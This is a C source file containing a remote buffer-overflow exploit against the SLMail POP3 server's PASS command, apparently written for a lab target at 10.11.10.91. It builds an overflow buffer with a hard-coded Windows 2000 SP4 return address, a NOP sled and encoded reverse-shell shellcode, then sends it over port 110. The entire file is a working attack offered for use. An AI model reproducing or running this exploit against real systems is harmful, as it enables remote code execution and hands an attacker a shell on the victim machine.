#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
/* \x8f\x35\x4a\x5f */

#define retadd "\x8f\x35\x4a\x5f" /*win2k server sp4 0x773a459f*/
#define port 110

/* revshell العراق القراصنة المجموعة*/
char shellcode[] =
"\xbd\xb7\x2b\xb0\xed\xd9\xc2\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x6b\x0e\x03\xdc\x25\x52\x18\xde\xd2\x10"
"\xe3\x1e\x23\x75\x6d\xfb\x12\xb5\x09\x88\x05\x05\x59\xdc\xa9"
"\xee\x0f\xf4\x3a\x82\x87\xfb\x8b\x29\xfe\x32\x0b\x01\xc2\x55"
"\x8f\x58\x17\xb5\xae\x92\x6a\xb4\xf7\xcf\x87\xe4\xa0\x84\x3a"
"\x18\xc4\xd1\x86\x93\x96\xf4\x8e\x40\x6e\xf6\xbf\xd7\xe4\xa1"
"\x1f\xd6\x29\xda\x29\xc0\x2e\xe7\xe0\x7b\x84\x93\xf2\xad\xd4"
"\x5c\x58\x90\xd8\xae\xa0\xd5\xdf\x50\xd7\x2f\x1c\xec\xe0\xf4"
"\x5e\x2a\x64\xee\xf9\xb9\xde\xca\xf8\x6e\xb8\x99\xf7\xdb\xce"
"\xc5\x1b\xdd\x03\x7e\x27\x56\xa2\x50\xa1\x2c\x81\x74\xe9\xf7"
"\xa8\x2d\x57\x59\xd4\x2d\x38\x06\x70\x26\xd5\x53\x09\x65\xb2"
"\x90\x20\x95\x42\xbf\x33\xe6\x70\x60\xe8\x60\x39\xe9\x36\x77"
"\x3e\xc0\x8f\xe7\xc1\xeb\xef\x2e\x06\xbf\xbf\x58\xaf\xc0\x2b"
"\x98\x50\x15\xfb\xc8\xfe\xc6\xbc\xb8\xbe\xb6\x54\xd2\x30\xe8"
"\x45\xdd\x9a\x81\xec\x24\x4d\xa4\xfb\x26\x60\xd0\xf9\x26\x7b"
"\x9a\x77\xc0\x11\xcc\xd1\x5b\x8e\x75\x78\x17\x2f\x79\x56\x52"
"\x6f\xf1\x55\xa3\x3e\xf2\x10\xb7\xd7\xf2\x6e\xe5\x7e\x0c\x45"
"\x81\x1d\x9f\x02\x51\x6b\xbc\x9c\x06\x3c\x72\xd5\xc2\xd0\x2d"
"\x4f\xf0\x28\xab\xa8\xb0\xf6\x08\x36\x39\x7a\x34\x1c\x29\x42"
"\xb5\x18\x1d\x1a\xe0\xf6\xcb\xdc\x5a\xb9\xa5\xb6\x31\x13\x21"
"\x4e\x7a\xa4\x37\x4f\x57\x52\xd7\xfe\x0e\x23\xe8\xcf\xc6\xa3"
"\x91\x2d\x77\x4b\x48\xf6\x97\xae\x58\x03\x30\x77\x09\xae\x5d"
"\x88\xe4\xed\x5b\x0b\x0c\x8e\x9f\x13\x65\x8b\xe4\x93\x96\xe1"
"\x75\x76\x98\x56\x75\x53"; 

struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(3500);
    memset(buffer, 0x00, 3500);
    char *off = malloc(2606);
/*    memset(off, 0x00, 2607); */
    memset(off, 0x41, 2606);
    char *nop = malloc(16);
/*    memset(nop, 0x00, 17); */
    memset(nop, 0x90, 16);
    char *cs = malloc(523);
/*    memset(nop, 0x00, 524); */
    memset(cs, 0x43, 523);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);
    strcat(buffer, cs);
    
    printf(buffer);
    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.10.91");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
